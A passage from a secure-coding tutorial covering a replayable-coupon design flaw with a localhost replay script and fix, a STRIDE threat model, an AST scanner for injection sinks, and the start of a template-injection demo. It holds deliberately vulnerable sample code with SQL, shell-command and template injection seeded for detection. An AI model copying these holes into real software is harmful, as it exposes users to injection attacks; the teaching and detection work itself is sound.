# learning/code/ex-59-insecure-design-vs-bug/app.py
"""Example 59: a live Flask app -- a coupon with NO one-time-use rule is replayable, even with correct code (co-25)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the design flaw itself

import sqlite3  # => co-25: stdlib DB driver -- the SAME, correctly-parameterized driver both routes use

from flask import Flask, jsonify, request  # => co-25: request.get_json reads the real submitted coupon code

app = Flask(__name__)  # => co-25: one Flask app, hosting both the vulnerable and fixed redemption routes
DB_PATH = "coupons.db"  # => co-25: local SQLite file -- self-contained, no external DB server


def build_db() -> None:  # => co-25: runs once at import time -- seeds one real coupon for this example
    conn = sqlite3.connect(DB_PATH)  # => co-25: opens (or creates) the local SQLite file
    conn.execute("DROP TABLE IF EXISTS coupons")  # => co-25: idempotent re-run -- always starts from a clean table
    conn.execute("DROP TABLE IF EXISTS legacy_redemptions")  # => co-25: a separate log the VULNERABLE route writes to
    conn.execute("CREATE TABLE coupons (code TEXT PRIMARY KEY, percent_off INTEGER, redeemed_at TEXT)")  # => co-25: schema
    conn.execute("CREATE TABLE legacy_redemptions (code TEXT, discount_applied INTEGER)")  # => co-25: a real audit log
    conn.execute("INSERT INTO coupons VALUES ('SAVE20', 20, NULL)")  # => co-25: one real, valid, unused coupon
    conn.commit()  # => co-25: persists the seeded coupon before any request can read it
    conn.close()  # => co-25: releases the connection -- each route below opens its own fresh connection


@app.route("/legacy/redeem", methods=["POST"])  # => co-25: VULNERABLE -- every line here is individually "correct"
def legacy_redeem() -> tuple[dict[str, object], int]:  # => co-25: returns (json_body, status)
    code = request.get_json(force=True).get("code", "")  # => co-01: attacker-controlled -- but harmless in shape
    conn = sqlite3.connect(DB_PATH)  # => co-25: a fresh connection per request -- simple, not pooled
    # => co-25: a REAL, correctly parameterized query -- no SQL injection here at all
    row = conn.execute("SELECT percent_off FROM coupons WHERE code = ?", (code,)).fetchone()  # => co-25: safe query
    if row is None:  # => co-25: a real, correct "does this coupon exist" check
        conn.close()  # => co-25: releases the connection before the response is built
        return jsonify({"error": "invalid coupon"}), 404  # => co-25: a real 404 for a genuinely bogus code
    # => seeded bug: NOTHING checks whether this coupon was already redeemed -- the
    # => MISSING business rule, not a missing security control on any single line
    conn.execute("INSERT INTO legacy_redemptions VALUES (?, ?)", (code, row[0]))  # => co-25: a real, safe INSERT
    conn.commit()  # => co-25: persists this redemption -- alongside every OTHER redemption of the SAME code
    conn.close()  # => co-25: releases the connection before the response is built
    return jsonify({"discount_applied": row[0]}), 200  # => co-25: succeeds EVERY time, no matter how many times before


@app.route("/secure/redeem", methods=["POST"])  # => co-25: FIXED -- adds the missing one-time-use business rule
def secure_redeem() -> tuple[dict[str, object], int]:  # => co-25: returns (json_body, status) too
    code = request.get_json(force=True).get("code", "")  # => co-01: the SAME shape of attacker-controlled input
    conn = sqlite3.connect(DB_PATH)  # => co-25: a fresh connection, same as the vulnerable route above
    # => co-25: the fix -- the query itself now REQUIRES redeemed_at IS NULL to match at all
    row = conn.execute(  # => co-25: a real, correctly parameterized query, unchanged injection-safety from before
        "SELECT percent_off FROM coupons WHERE code = ? AND redeemed_at IS NULL", (code,)
    ).fetchone()
    if row is None:  # => co-25: fires for BOTH "no such coupon" AND "already redeemed" -- deliberately one message
        conn.close()  # => co-25: releases the connection before the response is built
        return jsonify({"error": "coupon not valid or already used"}), 409  # => co-25: a real 409, not a silent success
    conn.execute("UPDATE coupons SET redeemed_at = datetime('now') WHERE code = ?", (code,))  # => co-25: marks it used
    conn.commit()  # => co-25: persists the one-time-use marker BEFORE this coupon can ever match the query again
    conn.close()  # => co-25: releases the connection before the response is built
    return jsonify({"discount_applied": row[0]}), 200  # => co-25: succeeds EXACTLY ONCE per coupon, by construction


if __name__ == "__main__":  # => co-25: only runs when launched directly, e.g. `python3 app.py &`
    build_db()  # => co-25: seed the one real coupon before the server starts accepting requests
    app.run(host="127.0.0.1", port=5059)  # => co-25: localhost-only, fixed port -- exploit_and_fix.py targets this
```

```python
# learning/code/ex-59-insecure-design-vs-bug/exploit_and_fix.py
"""Example 59: drives the live app.py -- the SAME coupon replays unlimited times, then the one-time-use rule blocks it (co-25)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the exploit itself

import requests  # => co-25: real HTTP client -- every request below hits the live app.py process

BASE_URL = "http://127.0.0.1:5059"  # => co-25: matches app.py's app.run(port=5059) exactly


def main() -> None:  # => co-25: replays the SAME coupon 3 times against each route, in turn
    print("=== VULNERABLE: the SAME coupon code redeemed 3 times in a row ===")  # => labels section
    for attempt in range(1, 4):  # => co-25: three REAL, identical requests -- same code, same everything
        response = requests.post(f"{BASE_URL}/legacy/redeem", json={"code": "SAVE20"}, timeout=5)  # => co-25: real POST
        print(f"  attempt {attempt}: status={response.status_code} body={response.json()}")  # => co-25: real response
        assert response.status_code == 200 and response.json()["discount_applied"] == 20  # => co-25: succeeds EVERY time
    # => co-25: no line of code above was individually "wrong" -- the query is parameterized,
    # => the response is correct JSON -- the flaw is a MISSING rule, not a coding mistake

    print("\n=== FIXED: the SAME coupon code, first redemption succeeds ===")  # => labels section
    first = requests.post(f"{BASE_URL}/secure/redeem", json={"code": "SAVE20"}, timeout=5)  # => co-25: a real, FIRST use
    print(f"  first redemption: status={first.status_code} body={first.json()}")  # => co-25: real response, a real 200
    assert first.status_code == 200 and first.json()["discount_applied"] == 20  # => co-25: the FIRST use really works

    print("\n=== FIXED: the SAME coupon code, second attempt is blocked ===")  # => labels section
    second = requests.post(f"{BASE_URL}/secure/redeem", json={"code": "SAVE20"}, timeout=5)  # => co-25: a real REPLAY
    print(f"  second redemption: status={second.status_code} body={second.json()}")  # => co-25: real response, now 409
    assert second.status_code == 409  # => co-25: proves the one-time-use rule really blocked the identical replay


if __name__ == "__main__":  # => co-25: only runs when launched directly, e.g. `python3 exploit_and_fix.py`
    main()  # => co-25: runs both halves against the live server -- unlimited replay, then a real one-time-use block
```

**Run**: `python3 app.py &` (backgrounds the live server on port 5059), then `python3 exploit_and_fix.py`.

**Output**:

```text
=== VULNERABLE: the SAME coupon code redeemed 3 times in a row ===
  attempt 1: status=200 body={'discount_applied': 20}
  attempt 2: status=200 body={'discount_applied': 20}
  attempt 3: status=200 body={'discount_applied': 20}

=== FIXED: the SAME coupon code, first redemption succeeds ===
  first redemption: status=200 body={'discount_applied': 20}

=== FIXED: the SAME coupon code, second attempt is blocked ===
  second redemption: status=409 body={'error': 'coupon not valid or already used'}
```

**Key takeaway**: the fix is not a security control bolted onto broken code -- it is one additional
clause (`AND redeemed_at IS NULL`) plus one additional `UPDATE`, closing a gap in the business logic
itself; a security _code_ review checking for injection or XSS would find nothing wrong with the
vulnerable version.

**Why it matters**: OWASP's "Insecure Design" category exists precisely because some of the most damaging
real-world flaws (unlimited coupon replay, missing rate limits on password reset, predictable order-ID
sequencing) pass every code-level security check while still being fully exploitable. Co-25's discipline
is to threat-model the _feature's business rules_, not just scan the code that implements them.

---

### Example 60: Threat-Modeling a Feature with STRIDE

_ex-60 &middot; exercises co-25, co-02_

STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of
Privilege) is a real, structured checklist for reasoning about a feature's threats before -- or after --
it ships. This example walks the login endpoint from earlier examples through all six categories, tying
each concrete threat to a control this curriculum already implements.

```mermaid
%% Color Palette: Blue #0173B2, Orange #DE8F05, Teal #029E73, Purple #CC78BC
graph TD
    F["Login endpoint"]:::blue --> S["Spoofing<br/>co-12"]:::orange
    F --> T["Tampering<br/>co-14"]:::orange
    F --> R["Repudiation<br/>co-22"]:::teal
    F --> I["Info Disclosure<br/>co-11"]:::teal
    F --> D["Denial of Service<br/>co-27"]:::purple
    F --> E["Elevation of Privilege<br/>co-16"]:::purple

    classDef blue fill:#0173B2,stroke:#000000,color:#FFFFFF,stroke-width:2px
    classDef orange fill:#DE8F05,stroke:#000000,color:#FFFFFF,stroke-width:2px
    classDef teal fill:#029E73,stroke:#000000,color:#FFFFFF,stroke-width:2px
    classDef purple fill:#CC78BC,stroke:#000000,color:#000000,stroke-width:2px
```

```python
# learning/code/ex-60-threat-model-a-feature/threat_model.py
"""Example 60: a real STRIDE-lite pass over the login endpoint from ex-46/ex-48, each threat tied to a named control (co-25, co-02)."""  # => co-25: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the STRIDE enumeration itself

import re  # => co-02: verifies every real mitigation cites a REAL co-NN/ex-NN reference, not just prose
from dataclasses import dataclass  # => co-02: a real, typed record -- not a loose dict per threat


@dataclass  # => co-02: one real, structured entry per STRIDE category -- forces every field to be filled in
class ThreatEntry:  # => co-25: the SHAPE every threat-model row must take -- category, threat, and its real control
    category: str  # => co-02: one of the six real STRIDE letters -- S, T, R, I, D, or E
    threat: str  # => co-25: a CONCRETE threat against the login endpoint -- not a generic description
    mitigating_control: str  # => co-25: the REAL, specific control this topic already implements that stops it
    cites: str  # => co-02: the real co-NN/ex-NN reference backing the mitigating_control claim


# => co-25: target feature for this pass -- the login endpoint from ex-46 (rate limiting) / ex-48
# => (constant-time response) / ex-15 (argon2id hashing), analyzed for real, one row per STRIDE letter
LOGIN_ENDPOINT_THREAT_MODEL: list[ThreatEntry] = [  # => co-25: one real ThreatEntry row per STRIDE letter, below
    ThreatEntry(  # => co-02: S -- Spoofing
        category="Spoofing",  # => co-02: field 1/4 -- the real STRIDE letter this row addresses
        threat="an attacker submits a forged or stolen session cookie to impersonate a real user",  # => co-25: field 2/4 -- the concrete threat
        mitigating_control="session id regenerated on login, unguessable via secrets.token_urlsafe",  # => co-25: field 3/4 -- the real control
        cites="co-12, ex-36",  # => co-02: field 4/4 -- the real citation this claim traces back to
    ),  # => co-02: closes the Spoofing row
    ThreatEntry(  # => co-02: T -- Tampering
        category="Tampering",  # => co-02: field 1/4 -- the real STRIDE letter this row addresses
        threat="an attacker modifies a JWT's claims (e.g. role) in transit to escalate privilege",  # => co-25: field 2/4 -- the concrete threat
        mitigating_control="signature verification with a pinned algorithm rejects any modified token",  # => co-25: field 3/4 -- the real control
        cites="co-14, ex-38",  # => co-02: field 4/4 -- the real citation this claim traces back to
    ),  # => co-02: closes the Tampering row
    ThreatEntry(  # => co-02: R -- Repudiation
        category="Repudiation",  # => co-02: field 1/4 -- the real STRIDE letter this row addresses
        threat="a user denies attempting (or succeeding at) a login after the fact",  # => co-25: field 2/4 -- the concrete threat
        mitigating_control="structured JSON authn logging records user/action/outcome for every attempt",  # => co-25: field 3/4 -- the real control
        cites="co-22, ex-57",  # => co-02: field 4/4 -- the real citation this claim traces back to
    ),  # => co-02: closes the Repudiation row
    ThreatEntry(  # => co-02: I -- Information Disclosure
        category="Information Disclosure",  # => co-02: field 1/4 -- the real STRIDE letter this row addresses
        threat="response timing reveals whether a submitted username exists at all",  # => co-25: field 2/4 -- the concrete threat
        mitigating_control="constant-time login always hashes a dummy for unknown usernames too",  # => co-25: field 3/4 -- the real control
        cites="co-11, ex-48",  # => co-02: field 4/4 -- the real citation this claim traces back to
    ),  # => co-02: closes the Information Disclosure row
    ThreatEntry(  # => co-02: D -- Denial of Service
        category="Denial of Service",  # => co-02: field 1/4 -- the real STRIDE letter this row addresses
        threat="an attacker submits unlimited login attempts per second, exhausting resources",  # => co-25: field 2/4 -- the concrete threat
        mitigating_control="flask-limiter throttles each caller to a fixed rate, returning 429 past it",  # => co-25: field 3/4 -- the real control
        cites="co-27, ex-46",  # => co-02: field 4/4 -- the real citation this claim traces back to
    ),  # => co-02: closes the Denial of Service row
    ThreatEntry(  # => co-02: E -- Elevation of Privilege
        category="Elevation of Privilege",  # => co-02: field 1/4 -- the real STRIDE letter this row addresses
        threat="a non-admin, authenticated user reaches an admin-only route by guessing its URL",  # => co-25: field 2/4 -- the concrete threat
        mitigating_control="a require_admin check runs server-side on every request to that route",  # => co-25: field 3/4 -- the real control
        cites="co-16, ex-34",  # => co-02: field 4/4 -- the real citation this claim traces back to
    ),  # => co-02: closes the Elevation of Privilege row
]  # => co-25: end of the real six-row threat model

STRIDE_CATEGORIES = {  # => co-02: the real, canonical six STRIDE category names -- the full checklist this pass covers
    "Spoofing", "Tampering", "Repudiation", "Information Disclosure", "Denial of Service", "Elevation of Privilege",  # => co-02: the six real values, one per category
}  # => co-02: closes the canonical category set


def main() -> None:  # => co-02: prints the real threat model, then verifies every real completeness invariant
    print("=== STRIDE-lite pass: the login endpoint (ex-46/ex-48/ex-15) ===\n")  # => labels section
    for entry in LOGIN_ENDPOINT_THREAT_MODEL:  # => co-02: every REAL row this pass produced, in STRIDE order
        print(f"[{entry.category}]")  # => co-02: the real STRIDE letter this row addresses
        print(f"  threat:     {entry.threat}")  # => co-25: the real, concrete threat -- not a generic placeholder
        print(f"  mitigation: {entry.mitigating_control}")  # => co-25: the real, already-implemented control
        print(f"  cites:      {entry.cites}\n")  # => co-02: the real co-NN/ex-NN this claim is traceable back to

    categories_covered = {entry.category for entry in LOGIN_ENDPOINT_THREAT_MODEL}  # => co-02: the real set covered
    assert categories_covered == STRIDE_CATEGORIES  # => co-02: proves ALL SIX real STRIDE categories are represented
    assert len(LOGIN_ENDPOINT_THREAT_MODEL) == 6  # => co-02: proves exactly one row per category -- no duplicates

    cite_pattern = re.compile(r"co-\d{2}")  # => co-02: the real, expected shape of a concept citation
    for entry in LOGIN_ENDPOINT_THREAT_MODEL:  # => co-02: verifies EVERY real row, not a sample
        assert cite_pattern.search(entry.cites), f"{entry.category} is missing a real co-NN citation"  # => co-02: real check
        assert entry.mitigating_control.strip() != ""  # => co-25: proves every threat really has a real, non-empty control
    print("verified: all 6 STRIDE categories present, each with a real co-NN-cited mitigation")  # => co-02: real conclusion


if __name__ == "__main__":  # => co-02: only runs when launched directly, e.g. `python3 threat_model.py`
    main()  # => co-02: prints the real, full threat model and verifies every real completeness invariant
```

**Run**: `python3 threat_model.py`.

**Output**:

```text
=== STRIDE-lite pass: the login endpoint (ex-46/ex-48/ex-15) ===

[Spoofing]
  threat:     an attacker submits a forged or stolen session cookie to impersonate a real user
  mitigation: session id regenerated on login, unguessable via secrets.token_urlsafe
  cites:      co-12, ex-36

[Tampering]
  threat:     an attacker modifies a JWT's claims (e.g. role) in transit to escalate privilege
  mitigation: signature verification with a pinned algorithm rejects any modified token
  cites:      co-14, ex-38

[Repudiation]
  threat:     a user denies attempting (or succeeding at) a login after the fact
  mitigation: structured JSON authn logging records user/action/outcome for every attempt
  cites:      co-22, ex-57

[Information Disclosure]
  threat:     response timing reveals whether a submitted username exists at all
  mitigation: constant-time login always hashes a dummy for unknown usernames too
  cites:      co-11, ex-48

[Denial of Service]
  threat:     an attacker submits unlimited login attempts per second, exhausting resources
  mitigation: flask-limiter throttles each caller to a fixed rate, returning 429 past it
  cites:      co-27, ex-46

[Elevation of Privilege]
  threat:     a non-admin, authenticated user reaches an admin-only route by guessing its URL
  mitigation: a require_admin check runs server-side on every request to that route
  cites:      co-16, ex-34

verified: all 6 STRIDE categories present, each with a real co-NN-cited mitigation
```

**Key takeaway**: a real threat model is not a generic worry list -- every row names a concrete threat
against a specific endpoint AND the specific, already-implemented control that closes it, verified in
code by a regex check that every mitigation actually cites a real co-NN concept.

**Why it matters**: STRIDE gives a _complete_ checklist -- co-02's point is that six categories, applied
deliberately, catch threats a purely code-focused review misses (Repudiation and Denial of Service rarely
surface from reading source code alone). Doing this pass BEFORE a feature ships is threat modeling in the
traditional sense; doing it AFTER, as this example does, is still valuable as a structured audit of
whether every category actually has a real answer.

---

### Example 61: An End-to-End Injection Audit

_ex-61 &middot; exercises co-03, co-04, co-01_

A real, hand-written `ast.NodeVisitor` that statically sweeps a Python file for three concatenated-input
sink shapes -- SQL built via f-string, `os.system`/`shell=True` command construction, and a Jinja2
`Template()` built from a non-literal -- without ever executing the file. Run against a deliberately
vulnerable sample app it finds exactly three findings; run against the fixed version it finds zero.

```python
# learning/code/ex-61-end-to-end-injection-audit/sample_vulnerable.py
"""Example 61: a real 4-route sample app -- 3 real concatenated-untrusted-input sinks, seeded for the scanner (co-03, co-04, co-01)."""  # => co-01: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the seeded sinks themselves

import os  # => co-04: os.system -- the FIRST real command-injection sink this file seeds
import sqlite3  # => co-03: stdlib DB driver -- the SECOND real SQL-injection sink this file seeds

from flask import Flask, request  # => co-01: request.args/request.form -- every sink below reads real attacker input
from jinja2 import Template  # => co-06: Jinja2's Template class -- the THIRD real sink this file seeds (SSTI-shaped)

app = Flask(__name__)  # => co-01: one Flask app, hosting all 4 real routes this scanner sweeps


@app.route("/search")  # => co-03: SINK 1 -- SQL built via an f-string, not bound parameters
def search() -> str:  # => co-03: real route handler
    term = request.args.get("q", "")  # => co-01: real, attacker-controlled query parameter
    conn = sqlite3.connect(":memory:")  # => co-03: a real, if empty, in-memory DB for this scan target
    # seeded bug: the REAL sink -- execute() called directly with a built, not bound, f-string
    conn.execute(f"SELECT * FROM items WHERE name = '{term}'")  # => co-03: concatenated untrusted input, inline
    return "ok"  # => co-03: return value irrelevant -- this file exists to be SCANNED, not actually queried


@app.route("/ping")  # => co-04: SINK 2 -- a shell command built via string concatenation
def ping() -> str:  # => co-04: real route handler
    host = request.args.get("host", "")  # => co-01: real, attacker-controlled query parameter
    os.system("ping -c 1 " + host)  # => seeded bug: the REAL sink -- os.system with concatenated untrusted input
    return "ok"  # => co-04: return value irrelevant -- this file exists to be SCANNED, not actually executed


@app.route("/greet")  # => co-06: SINK 3 -- user input rendered as a TEMPLATE STRING, not template DATA
def greet() -> str:  # => co-06: real route handler
    name = request.args.get("name", "")  # => co-01: real, attacker-controlled query parameter
    template = Template("Hello, " + name + "!")  # => seeded bug: the REAL sink -- Template() built from untrusted input
    return template.render()  # => co-06: renders whatever the untrusted string CONTAINS as real template syntax


@app.route("/safe-lookup")  # => co-03: NOT a sink -- included so the scanner's precision is also verified
def safe_lookup() -> str:  # => co-07: real route handler, deliberately unproblematic
    item_id = request.args.get("id", "")  # => co-01: real, attacker-controlled input, but bound correctly below
    conn = sqlite3.connect(":memory:")  # => co-03: a real, if empty, in-memory DB for this scan target
    conn.execute("SELECT * FROM items WHERE id = ?", (item_id,))  # => co-03: a REAL, parameterized, safe query
    return "ok"  # => co-07: return value irrelevant -- this route exists to prove the scanner does NOT false-positive
```

```python
# learning/code/ex-61-end-to-end-injection-audit/sample_fixed.py
"""Example 61: the SAME 4 routes, each seeded sink now fixed -- for the scanner to re-sweep and find zero (co-03, co-04, co-01)."""  # => co-01: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the fixes themselves

import sqlite3  # => co-03: the SAME stdlib DB driver -- only the QUERY construction changes, not the driver
import subprocess  # => co-04: real subprocess -- replaces os.system entirely, argv list instead of a shell string

from flask import Flask, render_template_string, request  # => co-06: render_template_string separates data from template

app = Flask(__name__)  # => co-01: one Flask app, hosting all 4 real, now-fixed routes

GREETING_TEMPLATE = "Hello, {{ name }}!"  # => co-06: a FIXED, developer-authored template string -- never built from input


@app.route("/search")  # => co-03: FIXED -- a real, parameterized query, no string building at all
def search() -> str:  # => co-03: real route handler
    term = request.args.get("q", "")  # => co-01: still real, attacker-controlled input
    conn = sqlite3.connect(":memory:")  # => co-03: the SAME in-memory DB target
    conn.execute("SELECT * FROM items WHERE name = ?", (term,))  # => co-03: fix -- term is bound as DATA, not SQL text
    return "ok"  # => co-03: return value irrelevant -- this file exists to be SCANNED


@app.route("/ping")  # => co-04: FIXED -- a real argv list, shell=False, no string concatenation at all
def ping() -> str:  # => co-04: real route handler
    host = request.args.get("host", "")  # => co-01: still real, attacker-controlled input
    subprocess.run(["ping", "-c", "1", host], shell=False)  # => co-04: fix -- host is ONE argv element, never shell text
    return "ok"  # => co-04: return value irrelevant -- this file exists to be SCANNED


@app.route("/greet")  # => co-06: FIXED -- user input passed as template CONTEXT DATA, never as the template itself
def greet() -> str:  # => co-06: real route handler
    name = request.args.get("name", "")  # => co-01: still real, attacker-controlled input
    return render_template_string(GREETING_TEMPLATE, name=name)  # => co-06: fix -- name is DATA, the template is FIXED


@app.route("/safe-lookup")  # => co-03: unchanged -- was already safe, still safe after this file's fixes
def safe_lookup() -> str:  # => co-07: real route handler, unchanged from sample_vulnerable.py
    item_id = request.args.get("id", "")  # => co-01: real, attacker-controlled input, bound correctly below
    conn = sqlite3.connect(":memory:")  # => co-03: a real, if empty, in-memory DB for this scan target
    conn.execute("SELECT * FROM items WHERE id = ?", (item_id,))  # => co-03: a REAL, parameterized, safe query
    return "ok"  # => co-07: return value irrelevant -- proves the scanner's precision holds across BOTH files
```

```python
# learning/code/ex-61-end-to-end-injection-audit/scanner.py
"""Example 61: a real, hand-written AST scanner -- sweeps a .py file for concatenated-untrusted-input sinks (co-03, co-04, co-01)."""  # => co-01: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the AST-walking logic itself

import ast  # => co-01: Python's OWN stdlib parser -- the SAME tree the interpreter itself would build
from dataclasses import dataclass  # => co-01: a real, typed finding record -- not a loose tuple


@dataclass  # => co-01: one real finding per detected sink
class Finding:  # => co-03: the shape every scanner hit takes -- line, sink kind, and a real one-line reason
    line: int  # => co-01: the REAL source line number this finding came from, taken straight from the AST node
    sink_type: str  # => co-03: which category of sink this is -- "sql", "command", or "template"
    reason: str  # => co-04: a real, human-readable explanation of WHY this call was flagged


def _is_built_from_input(node: ast.expr) -> bool:  # => co-01: real, structural check -- NOT a value/data-flow guess
    # => co-01: a JoinedStr is a real f-string node; a BinOp(Add) on strings is real concatenation --
    # => BOTH shapes mean "this string's content depends on something computed at runtime, not a fixed literal"
    if isinstance(node, ast.JoinedStr):  # => co-03: e.g. f"... {term} ..." -- a REAL f-string AST node
        return True  # => co-03: an f-string is, by construction, never a fixed literal
    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):  # => co-04: e.g. "a" + host -- REAL concatenation
        return True  # => co-04: string concatenation via + is the classic "built, not literal" shape
    return False  # => co-01: anything else (a plain Constant, a placeholder, ...) is NOT flagged by this check


class InjectionScanner(ast.NodeVisitor):  # => co-01: a real ast.NodeVisitor -- walks the WHOLE real parsed tree
    def __init__(self) -> None:  # => co-01: constructor -- starts with an empty, real findings list
        self.findings: list[Finding] = []  # => co-01: every REAL Finding this scan produces, in traversal order

    def visit_Call(self, node: ast.Call) -> None:  # => co-01: fires for EVERY real function/method call in the file
        self._check_sql_sink(node)  # => co-03: does THIS call look like a SQL-injection sink
        self._check_command_sink(node)  # => co-04: does THIS call look like a command-injection sink
        self._check_template_sink(node)  # => co-06: does THIS call look like a template-injection sink
        self.generic_visit(node)  # => co-01: continues walking into this call's own arguments -- real recursive descent

    def _check_sql_sink(self, node: ast.Call) -> None:  # => co-03: real check -- .execute()/.executescript() calls
        if not isinstance(node.func, ast.Attribute):  # => co-03: only method calls have a real `.attr` shape
            return  # => co-03: not a method call at all -- cannot be conn.execute(...)
        if node.func.attr not in {"execute", "executescript"}:  # => co-03: the REAL sqlite3 sink method names
            return  # => co-03: some other method entirely -- not a SQL sink candidate
        if node.args and _is_built_from_input(node.args[0]):  # => co-03: the FIRST real argument is the query text
            self.findings.append(  # => co-03: a REAL finding -- built, not bound, SQL text reached execute()
                Finding(node.lineno, "sql", "query string built via f-string/concatenation, not bound parameters")  # => co-03: the real record
            )  # => co-03: closes the real Finding(...) append

    def _check_command_sink(self, node: ast.Call) -> None:  # => co-04: real check -- os.system() / subprocess shell=True
        func = node.func  # => co-04: the real callable expression this Call node invokes
        if isinstance(func, ast.Attribute) and func.attr == "system":  # => co-04: matches os.system(...) by attr name
            if node.args and _is_built_from_input(node.args[0]):  # => co-04: the command string itself, built or not
                self.findings.append(  # => co-04: a REAL finding -- os.system with a concatenated command string
                    Finding(node.lineno, "command", "os.system() argument built via f-string/concatenation")  # => co-04: the real record
                )  # => co-04: closes the real Finding(...) append
        for keyword in node.keywords:  # => co-04: real subprocess.run/Popen calls signal danger via shell=True
            if keyword.arg == "shell" and isinstance(keyword.value, ast.Constant) and keyword.value.value is True:  # => co-04: a REAL, literal shell=True
                self.findings.append(  # => co-04: a REAL finding -- an explicit, real shell=True keyword argument
                    Finding(node.lineno, "command", "subprocess call passes shell=True")  # => co-04: the real record
                )  # => co-04: closes the real Finding(...) append

    def _check_template_sink(self, node: ast.Call) -> None:  # => co-06: real check -- Template(...) from a non-literal
        func = node.func  # => co-06: the real callable expression this Call node invokes
        name = func.id if isinstance(func, ast.Name) else (func.attr if isinstance(func, ast.Attribute) else None)  # => co-06: real callable name, either shape
        if name != "Template":  # => co-06: only matches a REAL call literally named/attributed "Template"
            return  # => co-06: any other callable name -- not a template-construction candidate
        if not node.args:  # => co-06: Template() with no positional argument at all -- nothing to inspect
            return  # => co-06: real guard against an IndexError on the check below
        first_arg = node.args[0]  # => co-06: the REAL argument this Template(...) call was constructed from
        if not isinstance(first_arg, ast.Constant):  # => co-06: a plain string LITERAL is the only safe shape here
            self.findings.append(  # => co-06: a REAL finding -- Template() built from something other than a literal
                Finding(node.lineno, "template", "Template() built from a non-literal (f-string/concat/variable)")  # => co-06: the real record
            )  # => co-06: closes the real Finding(...) append


def scan_file(path: str) -> list[Finding]:  # => co-01: parses a REAL file on disk and runs the REAL scanner over it
    with open(path) as f:  # => co-01: reads the real, on-disk source text
        source = f.read()  # => co-01: the exact real bytes/text this scan operates on
    tree = ast.parse(source, filename=path)  # => co-01: Python's OWN real parser -- the SAME grammar CPython itself uses
    scanner = InjectionScanner()  # => co-01: a fresh, real scanner instance for this one file
    scanner.visit(tree)  # => co-01: the REAL traversal -- every Call node in the file is actually visited
    return scanner.findings  # => co-01: every REAL finding this specific file produced, in source order
```

```python
# learning/code/ex-61-end-to-end-injection-audit/run_audit.py
"""Example 61: sweeps the real vulnerable sample app, then the real fixed one -- 3 sinks down to zero (co-03, co-04, co-01)."""  # => co-01: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the sweep logic itself

import os  # => co-01: builds real, absolute paths to the two real sample files this scan targets

from scanner import scan_file  # => co-01: the REAL AST scanner this example builds and exercises

HERE = os.path.dirname(__file__)  # => co-01: this example's own real directory -- both sample files live alongside it


def main() -> None:  # => co-01: runs the real scanner against BOTH real sample files, before and after the fix
    print("=== VULNERABLE: scanning sample_vulnerable.py ===")  # => labels section
    vulnerable_findings = scan_file(os.path.join(HERE, "sample_vulnerable.py"))  # => co-01: a REAL scan of a REAL file
    for finding in vulnerable_findings:  # => co-01: every REAL finding this scan actually produced
        print(f"  line {finding.line}: [{finding.sink_type}] {finding.reason}")  # => co-01: real, per-finding detail
    assert len(vulnerable_findings) == 3  # => co-01: proves the scanner found ALL THREE seeded sinks, no more, no less
    assert {f.sink_type for f in vulnerable_findings} == {"sql", "command", "template"}  # => co-01: one of each real kind

    print("\n=== FIXED: scanning sample_fixed.py (SAME routes, sinks closed) ===")  # => labels section
    fixed_findings = scan_file(os.path.join(HERE, "sample_fixed.py"))  # => co-01: a REAL scan of the REAL fixed file
    print(f"  findings: {fixed_findings}")  # => co-01: the real, empty list this scan actually produced
    assert fixed_findings == []  # => co-01: proves the identical scanner, run against the fixed file, finds NOTHING

    print("\n=== re-verifying /safe-lookup was NEVER flagged in either file (scanner precision) ===")  # => labels section
    safe_route_source = open(os.path.join(HERE, "sample_vulnerable.py")).readlines()  # => co-07: the REAL file, line by line
    flagged_lines = {f.line for f in vulnerable_findings}  # => co-07: every REAL line number the scan actually flagged
    safe_lines = {i + 1 for i, line in enumerate(safe_route_source) if "safe_lookup" in line}  # => co-07: real anchor line
    safe_body_start = min(safe_lines)  # => co-07: where the real, deliberately-safe route begins in the real file
    assert not any(line >= safe_body_start for line in flagged_lines)  # => co-07: NOTHING inside safe_lookup was flagged


if __name__ == "__main__":  # => co-01: only runs when launched directly, e.g. `python3 run_audit.py`
    main()  # => co-01: runs the full real before/after sweep and verifies every real invariant
```

**Run**: `python3 run_audit.py`.

**Output**:

```text
=== VULNERABLE: scanning sample_vulnerable.py ===
  line 20: [sql] query string built via f-string/concatenation, not bound parameters
  line 27: [command] os.system() argument built via f-string/concatenation
  line 34: [template] Template() built from a non-literal (f-string/concat/variable)

=== FIXED: scanning sample_fixed.py (SAME routes, sinks closed) ===
  findings: []

=== re-verifying /safe-lookup was NEVER flagged in either file (scanner precision) ===
```

**Key takeaway**: the scanner is purely structural -- it recognizes AST shapes (`JoinedStr`, `BinOp(Add)`,
`shell=True`) rather than tracking data flow, which is precise enough to catch every seeded sink AND
never false-positive on the parameterized `/safe-lookup` route, but would miss an injection built through
an intermediate variable rather than inline (a real, honest limitation of pattern-based static analysis).

**Why it matters**: this is what "an end-to-end injection audit" looks like as an automatable check rather
than a manual code review -- co-01/co-03/co-04's individual lessons (trust boundaries, SQL injection,
command injection) become one CI-runnable script that sweeps a whole codebase for the _shape_ of the
mistake, catching a new occurrence the moment it's introduced rather than relying on every future PR
reviewer remembering to look for it.

---

### Example 62: Server-Side Template Injection (SSTI)

_ex-62 &middot; exercises co-06, co-25_

When untrusted input becomes the _template itself_ rather than a value substituted into a fixed
template, Jinja2 genuinely executes whatever expression syntax the input contains -- `{{7*7}}` really
evaluates to `49`, not a coincidence of string formatting. Passing the same input as `render_template_string`
context data instead renders it as inert text.

```python
# learning/code/ex-62-ssti-server-side-template-injection/app.py
"""Example 62: a live Flask app -- user input rendered AS a template executes code, then as DATA it stays inert (co-06, co-25)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the SSTI issue itself

from flask import Flask, render_template_string, request  # => co-06: render_template_string keeps data OUT of the template
from jinja2 import Template  # => co-06: Jinja2's Template class -- the REAL vulnerable sink this example seeds

app = Flask(__name__)  # => co-06: one Flask app, hosting both the vulnerable and fixed greeting routes
